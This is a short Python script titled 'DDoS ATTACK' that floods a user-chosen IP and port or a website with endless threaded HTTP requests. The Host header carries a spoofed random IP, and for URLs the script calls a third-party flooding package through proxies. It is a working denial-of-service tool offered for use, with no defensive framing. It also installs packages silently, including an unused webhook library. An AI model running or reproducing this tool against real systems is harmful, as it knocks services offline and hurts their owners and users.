import socket
import threading
import os
import random
try:
    import DDos
    from DDos import checkUrl, DDos
except:
    os.system("pip3 install DDos")
    import DDos
    from DDos import checkUrl, DDos
from os import system
try:
    import socket
    import colorama
    from colorama import Fore
except:
    os.system("pip install colorama")
    os.system("pip install discord-webhook")
    import socket
    import colorama
    from colorama import Fore
clear = lambda: os.system('cls')
clear()

title = f'DDoS ATTACK'
system(f'title {title}')
A = random.randint(1,256)
B = random.randint(1,256)
C = random.randint(1,256)
D = random.randint(1,256)
fake_ip = f"{A}.{B}.{C}.{D}"
print(f'[1] Private IP')
print(f'[2] Web Site')
WS = input(f"\n[?]> ")
if WS == '1':
    target = input(f"\nPrivate IP : ")
    port = int(input(f"\nPrivate Port : "))
    Power = int(input(f"\nAttack Power : "))
    input(f"\nPress Enter To Start Attack ")
    attack_num = 0
    def attack():
        while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                global attack_num
                attack_num += 1
                print(f'[+] package send to victim : {attack_num}')
                s.close()
elif WS == '2':
    url = input(f"Give me a URL : ")
    power = input(f"attack power : ")
    nombr = input(f"nombre of attack :  ")
    while True:
        if checkUrl(url): break
        else: print("This URL isn't formatted correctly, try again")
    DDos(url, sockets = power, threads = nombr, use_proxies = True)
else:
    print(f"{WS} do not have a possible answer")
    exit = input(f'\nPress Enter For restart the program...')
if WS == '1':
    for i in range(Power):
        thread = threading.Thread(target=attack)
        thread.start()
else:
    pass